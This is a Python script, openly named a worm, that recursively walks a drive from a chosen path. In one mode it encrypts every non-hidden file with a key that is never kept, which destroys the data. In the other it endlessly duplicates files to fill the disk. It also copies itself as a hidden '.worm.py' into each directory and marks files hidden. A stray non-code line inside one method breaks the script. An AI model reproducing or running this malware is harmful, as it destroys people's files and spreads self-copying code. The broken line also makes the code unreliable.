import os
import shutil
import subprocess
from cryptography.fernet import Fernet

key = Fernet.generate_key()
fernet = Fernet(key)

class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if path is None:
            self.path = "/"
        else:
            self.path = path
        if target_dir_list is None:
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
        if iteration is None:
            self.iteration = 2
        else:
            self.iteration = iteration
        
        self.own_path = os.path.realpath(__file__)

    def list_directories(self, path, flag):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        for file_name in files_in_current_directory:
            if not file_name.startswith('.'):
                absolute_path = os.path.join(path, file_name)
                if flag == 1:
                    if os.path.isfile(absolute_path):  
                        with open(absolute_path, 'rb') as file:
                            original = file.read()

                        encrypted = fernet.encrypt(original)
                        
                        with open(absolute_path, 'wb') as encrypted_file:
                            encrypted_file.write(encrypted)
                        os.remove(file_name)
                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path, flag)

    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            directory with similar name
            shutil.copyfile(self.own_path, destination)
            
            self.set_hidden_attribute(destination)

    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file_name in file_list_in_dir:
                abs_path = os.path.join(directory, file_name)
                if os.path.isfile(abs_path) and not file_name.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, (file_name+str(i)))
                        try:
                            shutil.copyfile(source, destination)
                            
                            self.set_hidden_attribute(destination)
                        except PermissionError as e:
                            print(f"Permission denied: {e}")
                            continue


    def set_hidden_attribute(self, file_path):
        
        try:
            subprocess.run(['attrib', '+h', file_path], shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to set file '{file_path}' as hidden:", e)

    def start_worm_actions(self):
        flag = int(input("enter 0 to fill up the drive OR 1 to format and delete everything!!!!!! "))
        if flag == 0:
            while True:
                self.list_directories(self.path, flag=0)
                print(self.target_dir_list)
                #self.create_new_worm()
                self.copy_existing_files()
        elif flag == 1:
            self.list_directories(self.path, flag=1)

if __name__ == "__main__":
    current_directory = 'Write absolute path of the specific drive here if you want'
    worm = Worm(path=current_directory)
    worm.start_worm_actions()
